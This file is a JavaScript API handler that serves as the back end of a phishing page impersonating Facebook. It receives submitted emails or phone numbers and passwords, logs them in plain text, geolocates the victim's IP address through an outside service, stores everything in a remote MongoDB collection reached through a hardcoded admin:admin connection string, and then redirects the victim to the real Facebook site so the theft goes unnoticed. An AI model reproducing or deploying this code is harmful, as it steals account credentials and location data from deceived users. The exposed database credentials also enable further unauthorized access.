import https from 'https';
import { MongoClient } from 'mongodb';

// Function to get real IP
function getClientIP(req) {
  return req.headers['x-forwarded-for'] ||
         req.headers['x-real-ip'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.ip ||
         'Unknown';
}

// Function to get location from IP
function getLocationFromIP(ip, callback) {
  if (ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
    return callback(null, 'Local');
  }
  const url = `https://ipapi.co/${ip}/json/`;
  https.get(url, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        const location = `${json.city || 'Unknown'}, ${json.region || ''} ${json.country_name || 'Unknown'}`.trim();
        callback(null, location);
      } catch (err) {
        callback(err, 'Unknown');
      }
    });
  }).on('error', (err) => {
    callback(err, 'Unknown');
  });
}

export default async function handler(req, res) {
  console.log('API called with method:', req.method);
  if (req.method !== 'POST') {
    console.log('Method not allowed');
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email_or_phone = '', password = '', browser = '', os = '' } = req.body;
  console.log('Received data:', { email_or_phone, password, browser, os });
  const ip = getClientIP(req);

  // Obtener ubicación
  const location = await new Promise((resolve) => {
    getLocationFromIP(ip, (err, loc) => {
      resolve(loc);
    });
  });

  // Preparar datos para guardar
  const now = new Date().toISOString();
  const safeEmail = email_or_phone.replace(/\r?\n/g, ' ');
  const safePass = password.replace(/\r?\n/g, ' ');
  const safeBrowser = browser.replace(/\r?\n/g, ' ');
  const safeOs = os.replace(/\r?\n/g, ' ');
  const safeLocation = location.replace(/\r?\n/g, ' ');
  const data = {
    timestamp: now,
    ip,
    location: safeLocation,
    os: safeOs,
    browser: safeBrowser,
    email: safeEmail,
    password: safePass
  };

  // Conectar a MongoDB y guardar
  const uri = 'mongodb+srv://admin:admin@cluster0.i8y7xf2.mongodb.net/?appName=Cluster0';
  console.log('Connecting to MongoDB with URI:', uri);
  try {
    const client = new MongoClient(uri);
    console.log('MongoClient created');
    await client.connect();
    console.log('Connected to MongoDB');
    const db = client.db('Correos');
    const collection = db.collection('Data');
    await collection.insertOne(data);
    console.log('Data inserted into database:', JSON.stringify(data));
    await client.close();
    console.log('Connection closed');
  } catch (error) {
    console.error('Error saving to database:', error);
  }

  // Responder con JSON para que el cliente maneje la redirección
  res.status(200).json({ success: true, redirect: 'https://www.facebook.com/' });
}